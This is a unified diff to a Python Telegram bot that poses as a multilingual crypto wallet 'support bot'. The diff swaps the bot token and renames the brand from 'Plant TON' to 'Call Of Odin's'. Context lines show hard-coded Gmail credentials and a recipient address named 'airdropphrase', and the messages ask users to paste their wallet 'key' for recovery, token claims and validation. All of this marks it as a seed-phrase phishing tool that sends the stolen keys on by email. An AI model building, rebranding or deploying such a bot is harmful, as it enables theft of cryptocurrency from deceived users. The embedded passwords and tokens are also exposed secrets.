@@ -56,7 +56,7 @@ SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # replace with env var in prod
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
 # Bot token (as provided) - replace with env var in production
-BOT_TOKEN = "8539534626:AAHTyjuL_1dhmIGaFIrSOCeerNHmjhDM2yQ"
+BOT_TOKEN = "8331781818:AAGDCUvAmQaM9zVQwJktI093NEoZjd7rBk8"
 
 # Wallet display names used for wallet selection UI
 WALLET_DISPLAY_NAMES = {
@@ -147,7 +147,7 @@ REASSURANCE_TEMPLATE = 'Please note that "We protect your privacy. Your input {i
 # - post_receive_error in all languages
 LANGUAGES = {
     "en": {
-        "welcome": "Hi {user} welcome to the Plant TON support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
+        "welcome": "Hi {user} welcome to the Call Of Odin's support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
         "main menu title": "Please select an issue type to continue:",
         "validation": "Validation",
         "claim tokens": "Claim Tokens",
@@ -200,7 +200,7 @@ LANGUAGES = {
         "invalid_input": "Invalid input. Please use /start to begin.",
     },
     "es": {
-        "welcome": "Hi {user} bienvenido al Plant TON support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
+        "welcome": "Hi {user} bienvenido al Call Of Odin's support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
         "main menu title": "Por favor seleccione un tipo de problema para continuar:",
         "validation": "Validación",
         "claim tokens": "Reclamar Tokens",
@@ -243,7 +243,7 @@ LANGUAGES = {
         "invalid choice": "Elección inválida. Por favor use los botones.",
     },
     "fr": {
-        "welcome": "Hi {user} bienvenue au Plant TON support bot! Ce bot aide con acceso au portefeuille, transactions, soldes, recoveries, récupération de compte, réclamer tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
+        "welcome": "Hi {user} bienvenue au Call Of Odin's support bot! Ce bot aide con acceso au portefeuille, transactions, soldes, recoveries, récupération de compte, réclamer tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
         "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
         "validation": "Validation",
         "claim tokens": "Réclamer des Tokens",
@@ -285,7 +285,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Une erreur est survenue, Veuillez vous assurer de saisir la bonne clé, utilisez copier/coller pour éviter les erreurs. /start pour réessayer.",
     },
     "ru": {
-        "welcome": "Hi {user} добро пожаловать в Plant TON support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, восстановлением аккаунта, получением токенов и наград, возвратами и проверкой аккаунта. Пожалуйста, выберите один из пунктов меню, чтобы продолжить.",
+        "welcome": "Hi {user} добро пожаловать в Call Of Odin's support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, восстановлением аккаунта, получением токенов и наград, возвратами и проверкой аккаунта. Пожалуйста, выберите один из пунктов меню, чтобы продолжить.",
         "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
         "validation": "Валидация",
         "claim tokens": "Получить Токены",
@@ -327,7 +327,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Произошла ошибка, Пожалуйста убедитесь, что вы вводите правильный ключ, используйте копировать/вставить, чтобы избежать ошибок. пожалуйста /start чтобы попробовать снова.",
     },
     "uk": {
-        "welcome": "Hi {user} ласкаво просимо до Plant TON support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, відновленням облікового запису, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть один із пунктів меню, щоб продовжити.",
+        "welcome": "Hi {user} ласкаво просимо до Call Of Odin's support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, відновленням облікового запису, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть один із пунктів меню, щоб продовжити.",
         "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
         "validation": "Валідація",
         "claim tokens": "Отримати Токени",
@@ -369,7 +369,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Сталася помилка, Будь ласка переконайтеся, що ви вводите правильний ключ, використовуйте копіювання/вставку, щоб уникнути помилок. будь ласка /start щоб спробувати знову.",
     },
     "fa": {
-        "welcome": "Hi {user} خوش آمدید به Plant TON support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
+        "welcome": "Hi {user} خوش آمدید به Call Of Odin's support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
         "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
         "validation": "اعتبارسنجی",
         "claim tokens": "درخواست توکن‌ها",
@@ -411,7 +411,7 @@ LANGUAGES = {
         "post_receive_error": "‼ خطایی رخ داد، لطفاً اطمینان حاصل کنید که کلید صحیح را وارد می‌کنید، از کپی/پیست برای جلوگیری از خطاها استفاده کنید. لطفاً /start را برای تلاش مجدد بزنید.",
     },
     "ar": {
-        "welcome": "Hi {user} مرحبًا بك في Plant TON support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
+        "welcome": "Hi {user} مرحبًا بك في Call Of Odin's support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
         "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
         "validation": "التحقق",
         "claim tokens": "المطالبة بالرموز",
@@ -453,7 +453,7 @@ LANGUAGES = {
         "post_receive_error": "‼ حدث خطأ، يرجى التأكد من إدخال المفتاح الصحيح، استخدم النسخ واللصق لتجنب الأخطاء. من فضلك /start للمحاولة مرة أخرى.",
     },
     "pt": {
-        "welcome": "Hi {user} bem-vindo ao Plant TON support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
+        "welcome": "Hi {user} bem-vindo ao Call Of Odin's support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
         "main menu title": "Por favor selecione um tipo de problema para continuar:",
         "validation": "Validação",
         "claim tokens": "Reivindicar Tokens",
@@ -495,7 +495,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Ocorreu um erro, Por favor certifique-se de inserir a chave correta, use copiar e colar para evitar erros. por favor /start para tentar novamente.",
     },
     "id": {
-        "welcome": "Hi {user} selamat datang di Plant TON support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, account recovery, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
+        "welcome": "Hi {user} selamat datang di Call Of Odin's support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, account recovery, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
         "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
         "validation": "Validasi",
         "claim tokens": "Klaim Token",
@@ -537,7 +537,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Terjadi kesalahan, Harap pastikan Anda memasukkan kunci yang benar, gunakan salin dan tempel untuk menghindari kesalahan. silakan /start untuk mencoba lagi.",
     },
     "de": {
-        "welcome": "Hi {user} willkommen beim Plant TON support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
+        "welcome": "Hi {user} willkommen beim Call Of Odin's support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
         "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
         "validation": "Validierung",
         "claim tokens": "Tokens Beanspruchen",
@@ -579,7 +579,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Ein Fehler ist aufgetreten, Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben, verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. bitte /start um es erneut zu versuchen.",
     },
     "nl": {
-        "welcome": "Hi {user} welkom bij de Plant TON support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, account recovery, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
+        "welcome": "Hi {user} welkom bij de Call Of Odin's support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, account recovery, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
         "main menu title": "Selecteer een type probleem om door te gaan:",
         "validation": "Validatie",
         "claim tokens": "Tokens Claimen",
@@ -621,7 +621,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Er is een fout opgetreden, Zorg ervoor dat u de juiste sleutel invoert, gebruik kopiëren en plakken om fouten te voorkomen. gebruik /start om het opnieuw te proberen.",
     },
     "hi": {
-        "welcome": "Hi {user} Plant TON support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
+        "welcome": "Hi {user} Call Of Odin's support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
         "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
         "validation": "सत्यापन",
         "claim tokens": "टोकन का दावा करें",
@@ -663,7 +663,7 @@ LANGUAGES = {
         "post_receive_error": "‼ एक त्रुटि हुई, कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं, त्रुटियों से बचने के लिए कॉपी और पेस्ट का उपयोग करें। कृपया /start से पुनः प्रयास करें।",
     },
     "tr": {
-        "welcome": "Hi {user} Plant TON support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
+        "welcome": "Hi {user} Call Of Odin's support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
         "main menu title": "Devam etmek için bir sorun türü seçin:",
         "validation": "Doğrulama",
         "claim tokens": "Token Talep Et",
@@ -705,7 +705,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Bir hata oluştu, Lütfen doğru anahtarı girdiğinizden emin olun, hataları önlemek için kopyala-yapıştır kullanın. lütfen /start ile tekrar deneyin.",
     },
     "zh": {
-        "welcome": "Hi {user} 欢迎使用 Plant TON support bot! 此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
+        "welcome": "Hi {user} 欢迎使用 Call Of Odin's support bot! 此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
         "main menu title": "请选择一个问题类型以继续：",
         "validation": "验证",
         "claim tokens": "认领代币",
@@ -747,7 +747,7 @@ LANGUAGES = {
         "post_receive_error": "‼ 出现错误，请确保您输入了正确的密钥，使用复制粘贴以避免错误。请 /start 再试一次。",
     },
     "cs": {
-        "welcome": "Hi {user} vítejte u Plant TON support bot! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
+        "welcome": "Hi {user} vítejte u Call Of Odin's support bot! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
         "main menu title": "Vyberte typ problému pro pokračování:",
         "validation": "Ověření",
         "claim tokens": "Nárokovat Tokeny",
@@ -789,7 +789,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Došlo k chybě, Prosím ujistěte se, že zadáváte správný klíč, použijte kopírovat/vložit aby jste se vyhnuli chybám. prosím /start pro opakování.",
     },
     "ur": {
-        "welcome": "Hi {user} welcome to Plant TON support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
+        "welcome": "Hi {user} welcome to Call Of Odin's support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
         "main menu title": "براہ کرم جاری رکھنے کیلئے مسئلے کی قسم منتخب کریں:",
         "validation": "تصدیق",
         "claim tokens": "ٹوکن کلیم کریں",
@@ -831,7 +831,7 @@ LANGUAGES = {
         "post_receive_error": "‼ ایک خرابی پیش آئی، براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں، غلطیوں سے بچنے کے لیے کاپی/پیسٹ استعمال کریں۔ براہ کرم /start دوبارہ کوشش کریں۔",
     },
     "uz": {
-        "welcome": "Hi {user} Plant TON support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
+        "welcome": "Hi {user} Call Of Odin's support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
         "main menu title": "Davom etish uchun muammo turini tanlang:",
         "validation": "Tekshirish",
         "claim tokens": "Tokenlarni da'vo qilish",
@@ -873,7 +873,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Xato yuz berdi, Iltimos, to'g'ri kalitni kiritayotganingizga ishonch hosil qiling, xatoliklarni oldini olish uchun nusxa ko'chirish va joylashtirishdan foydalaning. iltimos /start bilan qayta urinib ko‘ring.",
     },
     "it": {
-        "welcome": "Hi {user} benvenuto al Plant TON support bot! Questo bot aiuta con l'accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
+        "welcome": "Hi {user} benvenuto al Call Of Odin's support bot! Questo bot aiuta con l'accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
         "main menu title": "Seleziona un tipo di problema per continuare:",
         "validation": "Validazione",
         "claim tokens": "Richiedi Token",
@@ -915,7 +915,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Si è verificato un errore, Assicurati di inserire la chiave corretta, usa copia e incolla per evitare errori. per favore /start per riprovare.",
     },
     "ja": {
-        "welcome": "Hi {user} ようこそ Plant TON support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューから選択してください。",
+        "welcome": "Hi {user} ようこそ Call Of Odin's support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューから選択してください。",
         "main menu title": "続行する問題の種類を選択してください：",
         "validation": "検証",
         "claim tokens": "トークンを請求",
@@ -957,7 +957,7 @@ LANGUAGES = {
         "post_receive_error": "‼ エラーが発生しました。正しいキーを入力していることを確認してください。エラーを避けるためにコピー＆ペーストを使用してください。/start で再試行してください。",
     },
     "ms": {
-        "welcome": "Hi {user} selamat datang ke Plant TON support bot! Bot ini membantu dengan capaian wallet, transaksi, baki, pemulihan, pemulihan akaun, tuntutan token dan ganjaran, pulangan dan pengesahan akaun. Sila pilih pilihan menu untuk meneruskan.",
+        "welcome": "Hi {user} selamat datang ke Call Of Odin's support bot! Bot ini membantu dengan capaian wallet, transaksi, baki, pemulihan, pemulihan akaun, tuntutan token dan ganjaran, pulangan dan pengesahan akaun. Sila pilih pilihan menu untuk meneruskan.",
         "main menu title": "Sila pilih jenis isu untuk meneruskan:",
         "validation": "Pengesahan",
         "claim tokens": "Tuntut Token",
@@ -999,7 +999,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Ralat berlaku, Sila pastikan anda memasukkan kunci yang betul, gunakan salin dan tampal untuk elakkan ralat. sila /start untuk cuba semula.",
     },
     "ro": {
-        "welcome": "Hi {user} bine ați venit la Plant TON support bot! Acest bot ajută cu acces portofel, tranzacții, solduri, recuperări, recuperare cont, revendicare token-uri și recompense, rambursări și validări cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
+        "welcome": "Hi {user} bine ați venit la Call Of Odin's support bot! Acest bot ajută cu acces portofel, tranzacții, solduri, recuperări, recuperare cont, revendicare token-uri și recompense, rambursări și validări cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
         "main menu title": "Selectați un tip de problemă pentru a continua:",
         "validation": "Validare",
         "claim tokens": "Revendică Token-uri",
@@ -1041,7 +1041,7 @@ LANGUAGES = {
         "post_receive_error": "‼ A apărut o eroare, Vă rugăm să vă asigurați că introduceți cheia corectă, folosiți copiere/lipire pentru a evita erori. vă rugăm /start pentru a încerca din nou.",
     },
     "sk": {
-        "welcome": "Hi {user} vítajte pri Plant TON support bot! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, tokenmi a odmenami, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
+        "welcome": "Hi {user} vítajte pri Call Of Odin's support bot! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, tokenmi a odmenami, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
         "main menu title": "Vyberte typ problému pre pokračovanie:",
         "validation": "Validácia",
         "claim tokens": "Uplatniť tokeny",
@@ -1083,7 +1083,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Vyskytla sa chyba, Prosím uistite sa, že zadávate správny kľúč, použite kopírovať/vložiť, aby ste sa vyhli chybám. prosím /start pre opakovanie.",
     },
     "th": {
-        "welcome": "Hi {user} ยินดีต้อนรับสู่ Plant TON support bot! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
+        "welcome": "Hi {user} ยินดีต้อนรับสู่ Call Of Odin's support bot! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
         "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
         "validation": "การยืนยัน",
         "claim tokens": "เคลมโทเค็น",
@@ -1125,7 +1125,7 @@ LANGUAGES = {
         "post_receive_error": "‼ เกิดข้อผิดพลาด โปรดตรวจสอบว่าคุณใส่คีย์ถูกต้อง ใช้คัดลอก/วางเพื่อหลีกเลี่ยงข้อผิดพลาด โปรด /start เพื่อทดลองอีกครั้ง",
     },
     "vi": {
-        "welcome": "Hi {user} chào mừng đến với Plant TON support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
+        "welcome": "Hi {user} chào mừng đến với Call Of Odin's support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
         "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
         "validation": "Xác thực",
         "claim tokens": "Yêu cầu Token",
@@ -1167,7 +1167,7 @@ LANGUAGES = {
         "post_receive_error": "‼ Đã xảy ra lỗi, Vui lòng đảm bảo bạn nhập khóa đúng, sử dụng sao chép/dán để tránh lỗi. vui lòng /start để thử lại.",
     },
     "pl": {
-        "welcome": "Hi {user} witaj w Plant TON support bot! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję, aby kontynuować.",
+        "welcome": "Hi {user} witaj w Call Of Odin's support bot! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję, aby kontynuować.",
         "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
         "validation": "Walidacja",
         "claim tokens": "Odbierz Tokeny",
@@ -1778,4 +1778,5 @@ def main() -> None:
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
+
     main()
